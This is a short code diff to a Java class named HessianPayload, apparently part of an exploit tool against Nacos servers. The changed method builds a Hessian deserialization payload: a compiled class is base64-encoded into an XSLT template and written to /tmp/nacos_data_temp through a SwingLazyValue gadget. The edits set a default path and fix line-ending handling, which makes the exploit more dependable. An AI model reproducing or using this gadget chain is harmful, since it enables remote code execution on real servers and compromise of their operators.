@@ -86,7 +86,7 @@ public class HessianPayload {
 
 
     public static Object genPayloadOfXslt(String payloadType) throws Exception {
-        String tmpPath = "";
+        String tmpPath = "/tmp/nacos_data_temp";
         if("linux".equalsIgnoreCase(os)){
             tmpPath = "/tmp/nacos_data_temp";
         }else if("windows".equalsIgnoreCase(os)){
@@ -101,7 +101,7 @@ public class HessianPayload {
             cc.setName(genClassName());
             byte[] bs = cc.toBytecode();
 
-            String base64Code = new sun.misc.BASE64Encoder().encode(bs).replaceAll("\n", "");
+            String base64Code = new sun.misc.BASE64Encoder().encode(bs).replaceAll("\r\n", "").replaceAll("\n", "");
             String xslt = xsltTemplate.replace("<base64_payload>", base64Code).replace("<class_name>", cc.getName());
             value = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{tmpPath, xslt.getBytes()});
         } else if (payloadType.equals("run")) {
